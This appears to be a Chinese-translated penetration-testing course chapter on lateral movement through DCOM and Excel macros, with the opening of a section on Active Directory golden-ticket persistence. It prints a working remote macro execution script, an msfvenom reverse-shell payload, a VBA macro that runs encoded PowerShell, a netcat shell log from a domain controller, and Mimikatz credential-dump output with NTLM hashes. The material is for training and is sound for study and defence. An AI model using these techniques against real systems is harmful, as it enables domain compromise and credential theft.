
## 既然已经为 SYSTEM 账户创建了配置文件文件夹，我们可以再次尝试调用 Open 方法，此时该方法应当能够成功执行并打开 Excel 文档。

既然文档已经打开，我们就可以使用以下完整的 PowerShell 脚本调用 Run 方法。

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [System.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

列表 718 - 远程执行 Excel 宏的概念验证代码

如图中图 312 所示，这段代码应该在远程机器上以一个高完整性上下文的后台进程形式打开 Notepad 应用程序。

![](img/ec25e59d75726b7041242a56d3376832_662_1.png)

图 312. 从 Excel 启动 Notepad

虽然创建远程 Notepad 应用程序很有趣，但我们需要升级此攻击以启动反向 shell。由于我们使用的是 Office 文档，我们可以直接复用之前在某个模块中介绍的 Microsoft Word 客户端代码执行技术。

为此，我们将使用 msfvenom 创建一个用于 HTA 攻击的 payload，因为它包含了将与 PowerShell 一起使用的 Base64 编码 payload：

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
No platform was selected, choosing Msf::Module::Platform:Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6461 bytes
Saved as: evil.hta
```

列表 719 - 使用 msfvenom 创建 HTA payload

请注意，我们使用的是 Windows 10 客户端第二个网络接口的 IP 地址，以便域控制器可以回调到我们的 Netcat 监听器。

接下来，我们提取以 "powershell.exe -nop -w hidden -e" 开头并跟随 Base64 编码 payload 的那一行，并使用列表 720 中的简单 Python 脚本将命令拆分为更小的块，从而绕过 Excel 宏中字符串字面量的大小限制：

```python
str = "powershell.exe -nop -w hidden -e aQ8mAGcAwWB3AG4AdABQ...."
n = 50
for i in range(0, len(str), n):
    print(str = Str + " " + str[i:i+n] + "")
```

列表 720 - 用于拆分 Base64 编码字符串的 Python 脚本

现在我们将更新 Excel 宏，使其执行 PowerShell 而不是 Notepad，并重复将其上传到域控制器并执行的步骤。

```vba
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e aQ8mAGcAwWB3AG4Ad"
    Str = Str + "ABQAHQAegBdADoAgBTAAGAAegBLACAALQB1AHEAIAA@ACkAeWA"
    ...
    Str = Str + "EQAaQBhAGcABgBvAHMAAdA gBpAGAwAuAfAAAcgBvAGMAZQBZAHM"
    Str = Str + "AXQAADoAwUB@AGEAcB@AgGAGAJAbZAcAOwA="
    Shell(Str)
End Sub
```

列表 721 - 使用拆分后的 Base64 编码字符串更新宏

在执行宏之前，我们将在 Windows 10 客户端上启动一个 Netcat 监听器，以接收来自域控制器的反向命令 shell：

```powershell
PS C:\Tools\practical_tools> nc.exe -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.111] from (UNKNOWN) [192.168.1.110] 59121
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

列表 722 - 通过 DCOM 横向移动技术获取的反向 shell

虽然该攻击需要同时访问 TCP 135（用于 DCOM）和 TCP 445（用于 SMB），但这仍然是一个相对较新的横向移动向量，可能会避开某些检测系统，例如网络入侵检测系统或基于主机的防病毒软件。

### 21.4.4.1 练习

- 重复使用 Excel 和 DCOM 启动 Notepad 的练习。
- 通过将 VBA 宏替换为连接回您的 Windows 学生虚拟机上 Netcat 的反向 shell 来改进攻击。
- 设置从域控制器到 Kali 主机的跳板通道并获取反向 shell。

## 21.5 Active Directory 持久化

一旦我们获得访问权限并实现项目的既定目标，我们的下一个目标就是获取持久化，确保不会失去对已入侵机器的访问权限。

我们可以在 AD 环境中使用传统的持久化方法，也可以获取 AD 特有的持久化。请注意，在许多实际的渗透测试或红队行动中，由于评估完成后可能无法完全清除的风险，持久化通常不在范围内。

### 21.5.1 黄金票据

回顾一下 Kerberos 认证的说明，我们记得当用户提交 TGT 请求时，KDC 会使用仅域内 KDC 知道的秘密密钥对 TGT 进行加密。这个秘密密钥实际上是一个名为 krbtgt 的域用户账户的密码哈希。<sup>696</sup>

如果我们能够获取 krbtgt 的密码哈希，我们就可以创建自己的自定义 TGT，或者说是黄金票据。

例如，我们可以创建一个 TGT，声称一个非特权用户实际上是域管理员组的成员，域控制器会信任它，因为它是正确加密的。

> 我们必须仔细保护被盗的 krbtgt 密码哈希，因为它授予无限的域访问权限。在执行此技术之前，请考虑获取客户的许可。

这提供了一种在 Active Directory 环境中保持持久化的巧妙方法，但最大的优势在于 krbtgt 账户的密码不会自动更改。

事实上，该密码仅在域功能级别从 Windows 2003 升级到 Windows 2008 时才会更改。因此，发现非常古老的 krbtgt 密码哈希并不罕见。

> 域功能级别<sup>697</sup> 决定了域的功能，并确定可以在域上运行的 Windows 操作系统。

<sup>696</sup> (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(\_=\_=ws.11)#Sec_KRBTGT

<sup>697</sup> (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/understanding-active-directory-domain-services--ad-ds--functional-levels

域控制器。较高的功能级别启用了额外的功能、特性和安全缓解措施。

为了测试这种持久化技术，我们将首先尝试通过 PsExec 以 OffSec 用户身份从 Windows 10 工作站横向移动到域控制器。由于我们没有适当的权限，这应该会失败：

```cmd
C:\Tools\active_directory> psexec.exe \\dc01 cmd.exe
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access dc01:
Access is denied.
```

![](img/ec25e59d75726b7041242a56d3376832_665_0.png)

在此阶段的项目中，我们应该拥有域管理员组成员的账户访问权限，或者我们已经攻破了域控制器本身。

凭借这种级别的访问权限，我们可以使用 Mimikatz 提取 krbtgt 账户的密码哈希。

为了模拟这种情况，我们将使用 jeff_admin 账户通过远程桌面登录到域控制器，从 C: 文件夹运行 Mimikatz，并执行如下所示的 **lsadump::lsa** 命令。

```text
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668

RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327

RID : 000001f5 (501)
User : Guest
LM :
NTLM :

RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
...
```

![](img/ec25e59d75726b7041242a56d3376832_665_1.png)

> *<sup>698</sup> Benjamin Delply, 2016, https://github.com/gentilkiwi/mimikatz/wiki/module~lsadump*

